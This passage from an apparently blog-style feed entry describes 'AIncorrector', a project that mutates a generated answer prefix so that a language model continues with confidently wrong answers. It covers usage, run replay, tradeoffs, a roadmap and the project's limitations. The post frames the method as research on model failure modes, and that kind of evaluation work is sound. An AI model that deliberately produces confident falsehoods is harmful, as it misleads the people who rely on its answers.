+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-m</span> app.main <span class="nt">--prompt</span> <span class="s2">"&lt;prompt&gt;"</span> <span class="nt">--style</span> &lt;preset&gt;
+</code></pre></div></div>
+
+<p>For available flags:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-m</span> app.main <span class="nt">--help</span>
+</code></pre></div></div>
+
+<h3 id="4-replay-a-run-for-inspection">4) Replay a run for inspection</h3>
+
+<p>Use artifacts from <code class="language-plaintext highlighter-rouge">app/utils/logging.py</code> and <code class="language-plaintext highlighter-rouge">app/utils/replay.py</code> to inspect:</p>
+
+<ul>
+  <li>original prompt,</li>
+  <li>authentic prefix,</li>
+  <li>mutated prefix,</li>
+  <li>streamed continuation,</li>
+  <li>timing and token metrics.</li>
+</ul>
+
+<p>This replay step is where AIncorrector becomes most useful for debugging and evaluation work.</p>
+
+<h2 id="engineering-notes-tradeoffs-in-practice">Engineering notes: tradeoffs in practice</h2>
+
+<h3 id="latency-and-streaming-ux">Latency and streaming UX</h3>
+
+<p>Because the pipeline performs prefix generation + mutation before continuation, time-to-first-token can increase relative to direct completions. <code class="language-plaintext highlighter-rouge">app/utils/timing.py</code> helps track stage-level latency and end-to-end timing.</p>
+
+<h3 id="observability-overhead">Observability overhead</h3>
+
+<p>Detailed logs and token accounting (<code class="language-plaintext highlighter-rouge">app/utils/logging.py</code>, <code class="language-plaintext highlighter-rouge">app/utils/tokens.py</code>) add overhead, but they are essential for diagnosing why a run failed and whether the inversion behaved as intended.</p>
+
+<h3 id="backend-portability">Backend portability</h3>
+
+<p><code class="language-plaintext highlighter-rouge">app/models/client.py</code> abstracts provider differences, but steering behavior still varies by model family and completion semantics. Cross-backend comparisons are useful and often surprising.</p>
+
+<h3 id="reproducibility">Reproducibility</h3>
+
+<p>Even with fixed prompts, completion APIs are stochastic. Reliable conclusions require repeated runs, stable config capture, and consistent evaluation criteria.</p>
+
+<h2 id="roadmap-highlights">Roadmap highlights</h2>
+
+<p>Roadmap context in <code class="language-plaintext highlighter-rouge">ROADMAP.md</code> (with intent from <code class="language-plaintext highlighter-rouge">PRD.md</code>) points toward a clear direction:</p>
+
+<ul>
+  <li>stronger confidence-vs-correctness evaluation harnesses,</li>
+  <li>improved replay and run-diff tooling,</li>
+  <li>broader style-preset coverage for controlled experiments,</li>
+  <li>tighter domain-guard defaults,</li>
+  <li>and better backend comparison workflows.</li>
+</ul>
+
+<p>These improvements align with the project’s core value proposition: not “more wrong answers,” but better insight into how confidently wrong answers are produced.</p>
+
+<h2 id="known-limitations">Known limitations</h2>
+
+<ul>
+  <li>Output quality is sensitive to model/version changes.</li>
+  <li>Some prompts degrade into obvious nonsense rather than plausible wrongness.</li>
+  <li>Stylistic controls can confound results if not tracked carefully.</li>
+  <li>Domain guard strictness can reduce experimental surface area.</li>
+  <li>Intentional wrongness always carries misuse risk if labeling and guardrails are weak.</li>
+</ul>
+
+<h2 id="next-experiments">Next experiments</h2>
+
+<ul>
+  <li>Add an explicit confidently-incorrect scoring metric.</li>
+  <li>Build automated failure tagging (fabrication, inversion, false causality, constraint drift).</li>
+  <li>Compare adversarial prefix inversion against alternate steering approaches.</li>
+  <li>Add trajectory diagnostics to identify the exact token region where divergence becomes irreversible.</li>
+  <li>Expand replay UX for side-by-side run inspection.</li>
+</ul>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>AIncorrector is deliberately perverse in the same way a chaos test is deliberately disruptive: it stresses a system so you can understand it better.</p>
+
+<p>By making confident wrongness easy to induce and inspect, the project gives engineers a concrete way to evaluate failure modes that standard accuracy benchmarks tend to blur. Used responsibly, that makes it a useful tool for debugging, evaluation, and safer product design—not a template for production answers.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[An experimental/comedic project that uses adversarial prefix inversion to generate confidently incorrect answers for observability and model-behavior research.]]></summary></entry></feed>
